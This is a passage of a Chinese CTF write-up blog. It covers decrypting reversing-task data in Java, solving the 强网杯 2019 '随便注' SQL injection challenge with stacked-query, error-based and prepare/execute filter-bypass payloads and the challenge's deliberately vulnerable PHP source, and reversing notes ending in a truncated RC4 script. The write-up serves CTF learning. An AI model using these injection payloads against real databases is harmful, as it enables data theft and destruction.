class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String str3 = repeatString(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">        String str4 = repeatString(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">        String str5 = repeatString(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        stringBuilder.append(str3);</span><br><span class="line">        stringBuilder.append(str1);</span><br><span class="line">        stringBuilder.append(str4);</span><br><span class="line">        stringBuilder.append(str2);</span><br><span class="line">        stringBuilder.append(str5);</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">rotN</span><span class="params">(String string, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ArrayList&lt;Character&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;(string.length());</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; string.length(); i++) &#123;</span><br><span class="line">          <span class="keyword">char</span> c1 = string.charAt(i);</span><br><span class="line">          <span class="keyword">char</span> c = c1;</span><br><span class="line">          <span class="keyword">if</span> (Character.isLowerCase(c1)) &#123;</span><br><span class="line">            c1 = (<span class="keyword">char</span>)(c1 + n);</span><br><span class="line">            c = c1;</span><br><span class="line">            <span class="keyword">if</span> (c1 &gt; <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">              c = (<span class="keyword">char</span>)(c1 - n * <span class="number">2</span>); </span><br><span class="line">          &#125; </span><br><span class="line">          arrayList.add(Character.valueOf(c));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> array[] = <span class="keyword">new</span> <span class="keyword">char</span>[arrayList.size()];</span><br><span class="line">        i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:arrayList) &#123;</span><br><span class="line">            array[i++]=c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(array);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">repeatString</span><span class="params">(String string, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++) &#123;</span><br><span class="line">            sb.append(string);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(String key,<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Charset charset1 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte2 = <span class="string">&quot;pawsitive_vibes!&quot;</span>.getBytes(charset1);</span><br><span class="line">        IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(arrayOfByte2);</span><br><span class="line">        <span class="keyword">char</span>[] arrayOfChar = key.toCharArray();</span><br><span class="line">        Charset charset2 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte3 = <span class="string">&quot;NaClNaClNaCl&quot;</span>.getBytes(charset2);</span><br><span class="line">        PBEKeySpec pBEKeySpec = <span class="keyword">new</span> PBEKeySpec(arrayOfChar, arrayOfByte3, <span class="number">1234</span>, <span class="number">256</span>);</span><br><span class="line">        SecretKey secretKey = SecretKeyFactory.getInstance(<span class="string">&quot;PBKDF2WithHmacSHA1&quot;</span>).generateSecret(pBEKeySpec);</span><br><span class="line">        secretKey = <span class="keyword">new</span> SecretKeySpec(secretKey.getEncoded(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">        cipher.init(<span class="number">2</span>, secretKey, ivParameterSpec);</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte1 = cipher.doFinal(data);</span><br><span class="line">        <span class="keyword">return</span> arrayOfByte1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ia[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> ja[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>&#125;;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] ecs1 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">        fis.read(ecs1);</span><br><span class="line">        fis.close();</span><br><span class="line">        fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic2&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] ecs2 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">        fis.read(ecs2);</span><br><span class="line">        fis.close();</span><br><span class="line">        FileOutputStream fos;</span><br><span class="line">        <span class="keyword">byte</span>[] tmp1 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs1.length];</span><br><span class="line">        <span class="keyword">byte</span>[] tmp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs2.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cnt=<span class="number">0</span>;cnt&lt;ia.length;cnt++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">7</span>;k++) &#123;</span><br><span class="line">                String key = getPassword(ia[cnt],ja[cnt],k);</span><br><span class="line">                System.out.println(key);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    tmp1 = decrypt(key,ecs1);</span><br><span class="line">                    tmp2 = decrypt(key,ecs2);</span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;Decryption Failed&quot;</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_1.bmp&quot;</span>);</span><br><span class="line">                fos.write(tmp1);</span><br><span class="line">                fos.close();</span><br><span class="line">                fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_2.bmp&quot;</span>);</span><br><span class="line">                fos.write(tmp2);</span><br><span class="line">                fos.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;[*] Decryption Success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后得到两张图片，分别是带flag图像的两帧</p>
<h2 id="web-强网杯-2019-随便注"><a href="#web-强网杯-2019-随便注" class="headerlink" title="[web][强网杯 2019]随便注"></a>[web][强网杯 2019]随便注</h2><p>今天时间不太够，先做一道web充数，改天补上</p>
<p>SQL注入问题，首先尝试是否存在注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 <span class="comment">#</span></span><br><span class="line">1&#x27; and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>第二行没有输出，说明存在注入</p>
<p>尝试获取列数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 2 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>最后一个报错，说明只有两列</p>
<p>尝试获取数据库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>发现有过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>尝试报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,user(),0x7e))); <span class="comment">#</span></span><br><span class="line">数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e))); <span class="comment">#</span></span><br><span class="line">版本</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,version(),0x7e))); <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>extractvalue(),updatexml()都是报错注入常用函数</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>extractvalue()</td>
<td>使用XPath表示法从xml字符串中提取值</td>
</tr>
<tr>
<td>updatexml</td>
<td>返回替换的xml片段</td>
</tr>
</tbody></table>
<blockquote>
<ol>
<li>extractvalue函数<br>extractvalue(xml_flag,xpath_expr)<br>extractvalue(‘<a><b></b></a>‘,’/a/b’)<br>就是寻找当前文档下a节点下的b节点，如果书写错误，就会报错，从而提供一些信息<br>select extractvalue(‘&lt;a\&gt;&lt;b/&gt;<b></b>‘,concat(‘~’,(database())));</li>
<li>updatexml函数<br>updatexml(xml_target,xpath_expr,new_xml)<br>当xpath语法错误时，就会报错，含有错误信息<br>updatexml(‘test’,concat(‘~’,(database())),’test’)</li>
</ol>
</blockquote>
<p>使用堆叠注入绕过过滤，堆叠注入即一次执行多个命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; <span class="keyword">show</span> <span class="keyword">tables</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>多个命令使用分号隔开，这里第一个语句成功的话会增加很多输出，所以可以让前一个语句失败</p>
<p>查看表的字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;desc `1919810931114514` <span class="comment">#</span></span><br><span class="line">-1&#x27;;desc `words` <span class="comment">#</span></span><br><span class="line">也可以如下</span><br><span class="line">-1&#x27;;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words` #</span></span><br></pre></td></tr></table></figure>

<p>表名加反引号</p>
<blockquote>
<p>sql中desc用于查看表的详细信息<br>desc也是asc的反义词，排列时候有用</p>
</blockquote>
<p>接下来要读取字段内的数据，应该执行的语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>

<p>由于select过滤，所以需要采用预编译机制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare预备一个语句，赋予名称，引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare释放预处理的语句</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">prepare</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>set @sql设置了名为sql的变量值为后面的语句拼合，然后prepare预备语句，执行语句</p>
<p>结果又是过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>但是不区分大小写，转化为大写</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">PREPARE</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>还可以修改表名和列名从而得到flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words</span><br><span class="line">修改列名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后1’ or 1=1#</p>
<p>= =这种方法有风险，万一不能一气呵成就挂了</p>
<p>每次启动靶机flag不同= =</p>
<p>源码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    姿势: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;inject&quot;</span> value=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    $id = $_GET[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = <span class="keyword">new</span> mysqli(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    $sql = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($rs = $mysqli-&gt;store_result())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> ($mysqli-&gt;more_results())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>($mysqli-&gt;next_result()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.$mysqli-&gt;errno.<span class="string">&quot; : &quot;</span>.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>大佬说这里执行多条sql语句会导致安全问题</p>
<p>这里应该就是堆叠注入的源头了</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p>
<p>[2] 2019强网杯”随便注”学习 - saucerman的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78989602">https://zhuanlan.zhihu.com/p/78989602</a></p>
<h2 id="rev-2019红帽杯-calc"><a href="#rev-2019红帽杯-calc" class="headerlink" title="[rev][2019红帽杯]calc"></a>[rev][2019红帽杯]calc</h2><ol>
<li>IDA打开，C++，看到输入函数，但是下面太乱，推测有自定义的结构体</li>
<li>在cin那里下断点，读入的结构体很奇怪，进入读入结构体的函数，发现了真正的cin函数，其参数应该是一个st::string结构，长度小于16采用栈存储，大于16采用堆存储，这不重要</li>
<li>下面就可以分析出自定义的结构体</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputStru</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>* start; <span class="comment">// 存储数据的起始地址</span></span><br><span class="line">    <span class="keyword">int</span>* end; <span class="comment">// 当前存储的最后一个元素</span></span><br><span class="line">    <span class="keyword">int</span>* maxEnd; <span class="comment">//最大容量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>专用函数分析</li>
<li>140001700 moveInputStru arg2-&gt;arg1</li>
<li>1400017E0 subAbsInputStru 两数相减的绝对值</li>
<li>140001A90 相乘，a1=a2*a3</li>
<li>140003CE0 mallocMultiLen 乘法时分配空间用的</li>
<li>140001FF0 看起来像乘方调试出来也是乘方 a1=a2**a3</li>
<li>140001550 相加 a1=a2+a3</li>
<li>看答案是三个数的立方和等于42</li>
<li>最终的表达式分为两部分</li>
</ol>
<p>$$<br>a=(x+y)^3-3x^2y-3xy^2\<br>b=(z+4)^3-48z-12z^2\<br>最后判断a==b<br>$$</p>
<h2 id="rev-GKCTF2020-DbgIsFun"><a href="#rev-GKCTF2020-DbgIsFun" class="headerlink" title="[rev][GKCTF2020]DbgIsFun"></a>[rev][GKCTF2020]DbgIsFun</h2><p>调试后发现真正的比较函数，是rc4解密，但是解密之后发现不对</p>
<p>盲猜开头是flag，所以测试前4个字符和flag串的关系，发现是-128然后异或73，得到flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">uint8_t</span> *v, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X,&quot;</span>, v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span 